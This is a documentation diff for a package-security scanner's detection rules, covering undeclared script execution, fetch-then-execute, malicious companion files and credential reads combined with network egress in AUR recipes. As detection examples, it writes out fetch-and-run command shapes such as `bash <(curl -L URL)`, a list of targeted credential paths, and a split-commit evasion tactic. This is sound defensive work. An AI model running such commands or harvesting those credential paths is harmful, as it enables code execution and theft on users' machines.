+### H081: Committed File Executed Without Declaration {#h081}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an H072-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path. A build tool (`make`, `cmake`, `ninja`, `meson`) whose *implicit* input file is in the manifest and undeclared counts as executing it. An argument continued onto the next physical line with `\` is not a command position.
+
+H069/H072 own files the recipe itself writes; H066 owns committed ELF
+binaries. Between them sat the cleartext helper script: committed to the AUR
+repository, never named in `source=()` (so makepkg never copies it into
+`$srcdir` and its bytes never reach the differ), and executed through
+`$startdir` or a `../` climb. Two signals, either sufficient: the `$startdir`
+or `../` path reference (available even without a manifest), or the basename
+in the tree manifest (only when a manifest was supplied - without one the rule
+never guesses). An absolute `/usr/share/...` target cannot be a repository
+file, however its basename collides, so the manifest signal requires a
+relative path.
+
+A build tool names no file on the command line, so no execution pattern saw
+one, and `make` sits in H072's benign-artifact exemption because almost every
+package runs it. The question is not the command but the file it reads: a
+`Makefile` committed to the AUR repository and absent from `source=()` is code
+with no checksum over it and nothing declaring it. The rule therefore resolves
+the implicit input of `make`/`gmake` (`GNUmakefile`, `makefile`, `Makefile`),
+`cmake` (`CMakeLists.txt`), `ninja` (`build.ninja`) and `meson`
+(`meson.build`), and fires only when that file is in the manifest and
+undeclared. A `-f` or `-C` flag names the input explicitly and is left to the
+ordinary execution patterns. All 14 diffs in the locked benign corpus that
+commit a build file declare it in `source=()`, so the arm fires on none of
+them. Detected by `_committed_execution_findings()` in
+`src/trustsight/analysis/delivery/_buildtree.py`.
+
+### H082: Fetch Then Execute {#h082}
+
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `network_execution`
+
+- **Condition:** Inside a build/package/check/prepare function (install hooks already have H017), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, glued or spaced, a `>` redirect, or a stdout-dash piped to `tee`), or with an interpreter one-liner (`python3 -c ... urlretrieve`, `perl -e ... getstore`, and the rest), and the same scope later executes that file. "The same scope" follows the call graph: a fetch in a helper and the execution in the `build()` that calls it are one operation.
+
+The **unattributed arm** covers the clients whose output grammar names no file: `sftp`/`ftp`/`ssh`/`nc`, `git fetch`/`pull`, `rclone moveto`/`move`/`bisync`/`copyurl`, `ipfs get`, `aws s3 cp`, `gsutil cp`, `b2 download`, `cvs`, `tftp`, `openssl s_client`, `npx`, a glued or server-decided flag, and a fetch-spec-in-file (`wget -i`, `aria2c -i`, `lftp -f`, `curl --config`). A later execution of an undeclared, non-benign file in the same reachable scope pairs with it; pairing crosses makepkg phases in order (`prepare` -> `build` -> `check` -> `package`), treats a loop variable (`bash "$f"`) as an unknown path, and follows a rename of a fetched file (`awk '1' repo/x.sh > run.me; escript run.me`). Executions under `$pkgdir` are the package's own output and are exempt. A scheme-bearing URL is left to H016 and the attributed arm, so one command is not scored twice.
+
+An execution under a system prefix (`/usr`, `/bin`, `/sbin`, `/lib`,
+`/opt`, `/etc`) is never attributed to a fetch: the build runs
+unprivileged, so a fetch cannot have written there, and
+`/usr/bin/vendor_perl/strip-nondeterminism` is a tool the packager runs,
+not a payload.
+
+The execution side is the same sink vocabulary H083 uses: shells, `sh -s < f`, interpreter `< f`, process substitution (`python3 < <(curl ...)`), `/dev/fd/N`, and `escript`, `fennel`, `zx`, `guile`, `racket`, `pwsh`, `julia`, `Rscript`, `deno`, `bun`, `elixir`, `ts-node` and the rest. Detected by `_fetch_then_execute_findings()` in `src/trustsight/analysis/delivery/__init__.py`.
+
+This is `curl -o stage.sh ... ; bash stage.sh` split across lines so the
+pipe-to-shell regex (R001/R002) never sees the `|`. Files that arrived via
+the declared `source=()` array are deliberately excluded - they have their
+own rule (H083), so checksum-bearing source files are not double-counted.
+
+The client list is not only `curl` and `wget`, because those are what a
+reviewer greps for: an interpreter that is already a makedepend fetches just
+as well, and `python3 -c 'import urllib.request;
+urllib.request.urlretrieve(url, "x.sh")'` writes a file the next line can run.
+The fetch and the execution are matched by *scope* rather than by enclosing
+function name, so splitting them across helpers does not separate them.
+Detected by `_fetch_then_execute_findings()` in
+`src/trustsight/analysis/delivery/__init__.py`.
+
+### H083: Downloaded Source File Executed {#h083}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** An interpreter (`bash`/`sh`/`zsh`/`dash`/`ksh`/`python`/`perl`/`ruby`), `source`, `.` or `./` form executes a file whose basename is declared in the `source=()` array.
+
+Checksums protect integrity, not intent: a `source=(... stage.sh)` followed by
+`bash "$srcdir/stage.sh"` is remote code execution just like `curl | bash`,
+only hidden behind the ordinary download path. The name does not matter: a
+downloaded `configure`, `make` or `Makefile` executed as a script fires too.
+`url=` is attacker-declared, so a host that matches it is not provenance, and
+a `name::url` rename that ships a payload under a benign name fires for the
+same reason. Detected by `edge_source_file_execution()` in
+`src/trustsight/analysis/delivery/__init__.py`.
+
+### H090: Committed Companion Carries A Fetch-Execute Payload {#h090}
+
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `delivery`
+
+- **Condition:** A committed `.service`, `.socket`, `.timer`, `.path`,
+  `.mount`, `.automount`, `.target`, `.desktop`, `.rules`, `.conf`, `.cfg`,
+  `.ini`, `.install`, `.hook`, `.patch` or `.diff`, or a build manifest
+  (`Makefile`/`GNUmakefile`, `build.ninja`, `CMakeLists.txt`, `meson.build`,
+  `SConstruct`, `BUILD`/`WORKSPACE`, `.mk`/`.ninja`/`.bazel`/`.cmake`),
+  whose content pipes a network fetch into an executor, feeds one to a
+  shell through process substitution (`bash <(curl -L URL)`) or a
+  `>(...)` fan-out, or - for a patch - whose *added* lines do.
+
+A `.service` whose `ExecStart=` pipes a download into a shell is the
+payload, and until now nothing read it. The diff shows the recipe staging
+the file, which is ordinary packaging and scored as such; the bytes that
+matter live in a file the diff does not touch.
+
+That split is available to an attacker as a schedule. Commit the unit in one
+push, where it is a file nobody runs. Add the `install` line in a later one,
+where the reviewer sees a single unremarkable line. Neither push contains an
+attack; both together do.
+
+The rule reads the committed file instead of inferring from the recipe. What
+it looks for is deliberately narrow - a network fetch whose output reaches
+an executor - because that is not something a unit file, a desktop entry or
+a udev rule in a package repository does for a legitimate reason. A patch is
+read by its added lines only: a hunk that *removes* a `curl … | sh` is the
+opposite of this rule's subject.
+
+The process-substitution arms were added after the yay typosquat campaign
+(yyay, yaay, yayy): its committed `.install` ran `bash <(curl -L URL)` with
+no pipe, which the pipe-keyed arm read as nothing. The same shapes H075 owns
+diff-scope now fire here manifest-scope, so the campaign's committed form
+is caught in every watch cycle, not only the one that introduced the file.
+
+Reading the content at all required a change underneath it. The tree
+manifest kept 64 bytes per file, which answers "is this an ELF" - all H066
+ever asked - and cannot answer "what does this unit run". Files whose names
+say a recipe can ship or apply them are now read to 16 KiB, with a 512 KiB
+ceiling across the whole tree, and a companion cut short by either bound
+marks the tree incomplete rather than reporting a full examination of a
+partial read.
+
+### H094: Unread Script Executed During Packaging {#h094}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** The W001 observable - a script neither declared nor
+  committed - executed inside `package()` or an install hook.
+
+`package()` stages files into `$pkgdir`. It is not where software gets
+built, and its output *is* the package. Running an unaudited script there
+is a different act from running one in `build()`.
+
+This is the scoring half of [W001](unverifiable.md#w001), and the split is
+measured rather than assumed: of the three benign corpus diffs that execute
+a script from the unpacked tree, two are in `build()` and one in
+`prepare()`. None is in `package()`. So W001 keeps weight 0 over the
+surface where the behaviour is ordinary, and the subset that is not
+ordinary is scored.
+
+Zero occurrences in the benign corpus.
+
+### C015: Fetch In package() {#c015}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+
+- **Condition:** A fetch client at a command position in the `package()`
+  body. Sources belong in `prepare`/`build`, where the checksum arrays
+  apply; fetching at artifact-assembly time bypasses source-array
+  accounting.
+
+Reads `RecipeDoc.functions["package"]` only. A client name inside a quoted
+dependency list or a comment is not a fetch, and `python -m pip install .`
+(a local install) stands down because the interpreter arm requires a
+scheme-bearing address on the line. Measured on the locked benign corpus:
+7 on the v1 corpus (0.19%).
+
+### C016: Interpreter Invocation In Install Hook {#c016}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+
+- **Condition:** An interpreter or explicit shell (`bash -c`, `sh`,
+  `python`, `perl`, `ruby`, `node`, `php`) at a command position inside a
+  `*_install`/`*_upgrade`/`*_remove` hook body. The hook runs as root at
+  pacman time.
+
+  Text that is only *printed* (a `cat`/`echo` advisory body in a printed
+  heredoc, or a printer's quoted string) is output, not executed shell, and
+  stands down. A literal shell re-exec wrapper (`sh -c '<lit>'`), as Debian
+  packaging templates generate, is unwrapped first: the inner literal is the
+  code that runs, so only an interpreter the body itself invokes fires. A
+  dynamic argument (`sh -c "$x"`) is not unwrapped and fires as written.
+  A body repeated across the hooks of one file is one finding.
+
+Only complete `.install` files are read (see the `partial_file_analysis`
+coverage gap). Measured on the locked benign corpus: 0 on the v1 corpus.
+
+### H107: Credential Store Access With Egress {#h107}
+
+- **Target:** programmatic (credential path + egress finding)
+- **Severity:** HIGH (weight 25)
+- **Category:** `exfil`
+
+- **Condition:** An added build/install line reads a credential-specific path and the same change has network egress or an upload finding (`H016`, `H017`, `H041`, `H071`, `H075`, `H082`, or `H090`).
+
+Reading a configuration file is ordinary packaging; sending data is ordinary
+in isolation. The conjunction is a credential-stealer step written directly
+into the recipe rather than hidden in an external binary. The path list covers
+SSH keys, cloud credentials, GitHub/npm/Docker configuration, browser profile
+stores, `/etc/shadow`, GPG material and `/proc/*/environ`.
+
+The rule requires both halves. A package that reads its own configuration
+without any egress must stay quiet.
+
+## Interpretation
+
+- The rule names the **use** (fetch, then execute), not proof of malice. A
+  package that genuinely must build from a download can say so; the point is
+  that the reviewer sees it and it cannot hide in the noise.
+- Findings are line-anchored and come with the matched text, so the reviewer
+  reads the actual recipe rather than trusting a label.
+- Fetch and execute in one line, across lines, via a variable, or through a
+  package manager are the same finding family; the cross-file and
+  reducing-the-h-series work exists so the set stays small enough to audit.
+
+## Related documentation
+
+- [Fire Rates](../explanation/historical-and-behavioral-analysis.md); how H rules are calibrated
+- [Reducing the H-Series](../explanation/detection-and-evidence.md)
